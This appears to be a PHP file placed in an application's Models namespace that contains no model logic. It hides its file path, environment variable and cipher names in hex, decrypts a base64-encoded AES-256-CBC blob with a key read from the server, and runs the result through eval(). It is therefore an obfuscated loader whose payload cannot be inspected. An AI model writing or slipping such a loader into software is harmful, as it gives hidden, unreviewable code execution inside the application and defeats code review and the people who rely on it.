<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('SKbINnzCDdlacdmCK5KCrA==');

$c=base64_decode(

'Svz1X34rAWtmapYZrqYXuqB9KCcTJ1YZyP07mtd5Nr66MB6JjNwowQzygp+vUIF2K182w7onMODd' .
'+NMpIjEJ2GQVWmlzn6dZZ8CVY8WLt3Gwo2pYT6JSY8PXyPBp30HezoTMtwzYMAtCLsDBPGBswQ9I' .
'QOLFcFkqDv1oxtK+mRZlhOg69XyJeMJs0c0tXNWrwdzrk4+c6WYm2MGJdJlvwgFvuRdUAAHdoXlj' .
'UKBQcXRYuki2Q65nsu0qmDzUyRuFiG2pIp+Uj9E3Leo2Y0310HnTCG5zI/FjXqY1oTIPznfp4+na' .
'JxBjiEfv+APDhtN9U2gwBYTAFlm3QxV9M9jpgODGJ8x3MhwK227zgQ76xB29oXsjzIFo6l9RdyLA' .
'/2/C3H1FVS1KbsNjKGA+HoT36MlHfUevgsU7xcI4z+5jib9suD752HJBQRPo4Nwu6MxLkWzY9XMq' .
'8d1cPyRA2QOMOeX25eLebOXaCsedinY1+TFw4KDqmNifWMn+kLtiBFxlR6Vxb+27MEKyg4I8fue0' .
'sOJFAAS++5giYenWbNFFQx09sFs+QlN3YIc6Sxdq13DAXO3B8581crziu/dr/BSaIWZW3nspRTSc' .
'jOR5Lq8g4FMV/Fi6Fsa4pwGhRDLBzYbBJQm+h0EHU1o+Z6qcfHi2tLOZ+/DTKLmO2oMoVFzQ42mj' .
'0PbFfwaX7MSiqFgt/SmB4h5iUctZ3JeoJLeBywGASQA8RH/sm3FfQDzb8TrWof5i9eo6ao/FkLdP' .
'RHrJ//f+aP8el3I2AmCPHyAPHsKFVUd1hxfcp9vfhfDAz65T6iEgVXGizG6AIKn6G5d7FbVB8l1F' .
'l5Su8dLSufxYISil0t4ts/ajdAoMrlyQjEwyuZfH4O62kkbLjyoPNm0oK24w'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

